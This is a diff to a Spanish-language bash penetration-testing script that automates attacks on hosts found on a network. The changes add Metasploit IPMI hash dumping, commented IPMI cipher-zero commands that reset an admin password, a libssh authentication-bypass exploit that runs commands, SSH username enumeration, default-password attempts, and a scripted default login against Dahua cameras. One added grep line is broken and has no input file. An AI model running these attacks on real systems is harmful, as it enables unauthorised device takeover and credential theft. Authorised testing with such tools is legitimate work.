@@ -12,6 +12,8 @@
 # sslscan -h
 ##
 
+#bash-obfuscate lanscanner_original.sh -o lanscanner.sh
+
 OKBLUE='\033[94m'
 OKRED='\033[91m'
 OKYELLOW="\033[0;33m" 
@@ -1083,17 +1085,23 @@ then
 		echo -e "\t[+] Probando usuario anonimo"		
 		echo "ipmitool -I lanplus -H $ip -U '' -P '' user list" >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
 		ipmitool -I lanplus -H $ip -U '' -P '' user list >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
-		grep -i "ADMINISTRATOR" logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt > .vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 	
+		grep -i "ADMIN" logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt > .vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 	
 		
 		echo -e "\t[+] Probando vulnerabilidad cipher-zero"
 		echo "nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
 		nmap -sU --script ipmi-cipher-zero -p $port -Pn -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
 		
+		#exploit
+		#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user list 
+		#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user set password 1 123456 
+		
 		echo -e "\t[+] Probando si se puede extraer hashes"
-		msfconsole -x "auxiliary/scanner/ipmi/ipmi_dumphashes;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt 2>/dev/null		
+		msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes;set RHOSTS $ip;set CRACK_COMMON false;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt 2>/dev/null							   
 		egrep --color=never -i "Hash found" logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt  >> .vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt
 		egrep --color=never -i "Hash for user" logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt  >> .vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt
+		#hashcat -m 7300 out.hashcat -a 3 ?a?a?a?a
+				
 	done
 	
 	#insert clean data	
@@ -1283,11 +1291,31 @@ then
 		echo -e "\t[+] Obtener banner"
 		echo -e "\tquit" | nc -w 4 $ip $port | strings | uniq> .banners/"$ip"_"$port".txt 2>/dev/null
 		#SSHBypass
-		grep --color=never "libssh" .banners/"$ip"_"$port".txt > .vulnerabilidades/"$ip"_"$port"_SSHBypass.txt 
+		echo -e "\t[+] Probando vulnerabilidad libSSH bypass"	
+		grep --color=never "libssh" 
 		
-		echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"	
-		enumeracionUsuariosSSH.py --username root --port $port $ip > logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt 2>/dev/null
-		grep "is a valid" logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt  > .vulnerabilidades/"$ip"_"$port"_CVE15473.txt
+		egrep -iq "libssh" .banners/"$ip"_"$port".txt  2>/dev/null
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			libsshauthbypass.py --host $ip --port $port --command "whoami" > logs/vulnerabilidades/"$ip"_"$port"_SSHBypass.txt 
+			
+			egrep -iq "Not Vulnerable" logs/vulnerabilidades/"$ip"_"$port"_SSHBypass.txt  2>/dev/null
+			greprc=$?
+			if [[ $greprc -eq 1 ]] ; then
+				echo "Vulnerable a libSSH bypass"  > .vulnerabilidades/"$ip"_"$port"_SSHBypass.txt
+			fi									
+		fi	
+							
+		echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"				
+		#usuario root123445 no existe, si sale "is a valid user" el target no es vulnerable
+		enumeracionUsuariosSSH.py --username root123445 --port $port $ip > logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt 2>/dev/null		
+		egrep -iq "is not a valid user" logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt 2>/dev/null
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			enumeracionUsuariosSSH.py --username root --port $port $ip > logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt 2>/dev/null
+			grep "is a valid" logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt  > .vulnerabilidades/"$ip"_"$port"_CVE15473.txt
+		fi	
+		
 		
 		echo -e "\t[+] Probando passwords"	
 		echo -e "\n medusa -h $ip -u admin -p admin -M ssh" >> logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null
@@ -2901,13 +2929,13 @@ cd webClone
 	######### buscar IPs privadas
 	echo -e "\t\t\t[+] Revisando si hay divulgación de IPs privadas"	
 	grep -ira "192.168." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
-	grep -ira "172.16." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt						
-						
+	grep -ira "172.16." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
+							
 	grep -ira "http://172." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
 	grep -ira "http://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
 	grep -ira "http://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
 
-	grep -ira "https://172." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
+	grep -ira "https://172" * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
 	grep -ira "https://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
 	grep -ira "https://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
 	###############################	
@@ -3223,7 +3251,7 @@ cd .nmap
 	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ZTE2.txt
 	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ZTE2.txt
 	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/tp-link.txt
-	grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/cisco.txt
+	#grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/cisco.txt
 	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ciscoASA.txt	
 	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/samba.txt
 	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/RomPager.txt
@@ -3272,6 +3300,9 @@ cd .nmap
 	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
 	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/pentaho.txt
 	
+	#Dahua Camera
+	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/dahua_camara.txt
+	
 	#ubiquiti
 	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/ubiquiti2.txt	
 	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt
@@ -3283,10 +3314,14 @@ cd .nmap
 	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/PRTG.txt
 	
 	#ZKsoftware
-	grep --color=never -i ZK * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389"| sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../servicios/ZKSoftware.txt		
+	grep --color=never -i ZK * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/ZKSoftware.txt		
+	
+	
+	#Cisco
+	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/cisco.txt		
 	
 	#ZTE
-	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../servicios/ZTE2.txt
+	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/ZTE2.txt
 	sort ../servicios/ZTE2.txt | uniq > ../servicios/ZTE.txt ; rm ../servicios/ZTE2.txt
 		
 	
@@ -3799,6 +3834,33 @@ then
 	insert_data
 fi
 
+
+# dahua web default password
+if [ -f servicios/dahua_camara.txt ]
+then
+	echo -e "$OKBLUE #################### dahua web (`wc -l servicios/dahua_camara.txt`) ######################$RESET"	    
+	while read line     
+	do     						
+		echo -e "[+] Escaneando $line"	
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"` 
+		echo -e "\t[+] Probando password por defecto"
+		if [[ $port == "443" || $port == "8443"  ]]
+		then
+			curl -d '{"method":"global.login","session":2033161537,"params":{"userName":"admin","password":"E1C68AE9E791F6280431E76B7E245A5C","clientType":"Web3.0"},"id":10000}' -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0" -H "Accept: text/javascript, text/html, application/xml, text/xml, */*" -H "X-Requested-With: XMLHttpRequest" -H "X-Request: JSON" -X POST https://$ip:$port/RPC2_Login > logs/vulnerabilidades/"$ip"_"$port"_passwordDahua.txt 2>/dev/null		 	
+		else
+			curl -d '{"method":"global.login","session":2033161537,"params":{"userName":"admin","password":"E1C68AE9E791F6280431E76B7E245A5C","clientType":"Web3.0"},"id":10000}' -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0" -H "Accept: text/javascript, text/html, application/xml, text/xml, */*" -H "X-Requested-With: XMLHttpRequest" -H "X-Request: JSON" -X POST http://$ip:$port/RPC2_Login > logs/vulnerabilidades/"$ip"_"$port"_passwordDahua.txt 2>/dev/null
+		fi
+		
+		egrep -iq "true" logs/vulnerabilidades/"$ip"_"$port"_passwordDahua.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then	
+			echo "$line Usuario:admin Password:admin" >.vulnerabilidades/"$ip"_"$port"_passwordDahua.txt		
+		fi
+				
+ 	done <servicios/dahua_camara.txt	
+	insert_data
+fi
 	
 		
 			
@@ -4389,15 +4451,16 @@ done
 
 
 ########## Phpinfo ###
-grep "phpinfo" .enumeracion2/* 2>/dev/null| while read -r line ; do	
+grep "phpinfo" .enumeracion2/* 2>/dev/null| while read -r line ; do	 # Obtener los archivos marcados como  phpinfo
+	#200	http://192.168.50.154:80/img/ (Phpinfo)	 TRACE
 	echo -e  "$OKRED[!] Archivos phpinfo $RESET"		
     archivo_origen=`echo $line | cut -d ':' -f1`
     #echo "archivo_origen $archivo_origen"
     archivo_destino=$archivo_origen       
 	archivo_destino=${archivo_destino/.enumeracion2/logs\/enumeracion}  # de este directorio se prueba si es un phpinfo de verdad 
-	archivo_destino=${archivo_destino/webdirectorios/divulgacionInformacion}   			
-    contenido=`echo $line | awk '{print $2}'`    
-    #200	http://192.168.50.154:80/img/ (Phpinfo)	 TRACE
+	archivo_destino=${archivo_destino/webdirectorios/divulgacionInformacion}
+	archivo_destino=${archivo_destino/webarchivos/divulgacionInformacion}	
+    contenido=`echo $line | awk '{print $2}'`        
     #echo "contenido $contenido"
     echo $contenido >> $archivo_destino        
 done
@@ -4420,13 +4483,13 @@ for archivo in `ls logs/enumeracion/*_divulgacionInformacion.txt 2>/dev/null;`; 
 		#echo "url $url"
 		#logs/vulnerabilidades/104.198.171.232_80_divulgacionInformacion.txt:
 	   #if [[ (${url} == *"linux"* || ${device} == *"Ubuntu"*  || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
-		if [[ ${url} == *"error"* || ${url} == *"log"*  ]];then 			
+		if [[ ${url} == *"error"* || ${url} == *"log"* || ${url} == *"dwsync"*  ]];then  			
 			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url) $RESET"			
 			echo $url >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
 			echo "" >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
 		else
 			echo -e "[+] Posible archivo PhpInfo ($url)" 
-			phpinfo.pl -url "\"$url\"" >> logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null	
+			phpinfo.pl -url "\"$url\"" > logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null	
 			
 			egrep -iq "No es un archivo PHPinfo" logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
 			greprc=$?
